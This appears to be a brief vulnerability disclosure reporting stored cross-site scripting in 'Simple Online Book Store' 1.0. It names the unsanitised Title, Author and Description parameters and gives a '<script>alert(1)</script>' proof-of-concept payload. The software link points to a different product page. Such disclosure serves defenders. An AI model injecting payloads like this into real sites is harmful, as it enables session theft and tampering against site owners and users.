# Simple Online Book Store-XSS



### Date: 

> ### 2022-08/05



### Exploit Author:

> ### anx0ing@gmail.com



### Vendor Homepage: 

> [https://www.sourcecodester.com](https://www.sourcecodester.com/)



### Software Link: 

> https://www.sourcecodester.com/php/15434/library-management-system-qr-code-attendance-and-auto-generate-library-card.html



### Version: 

> ### 1.0



### /admin_book.php

`Title`、`Author`、`Description`Parameters have XSS

### /admin_add.php

> add xss code

```
<script>alert(1)</script>
```

![image-20220805020553454](https://cdn.jsdelivr.net/gh/beytagh001/blog-img/image-20220805020553454.png)

Triggered in admin_book.php

![image-20220805021508840](https://cdn.jsdelivr.net/gh/beytagh001/blog-img/image-20220805021508840.png)
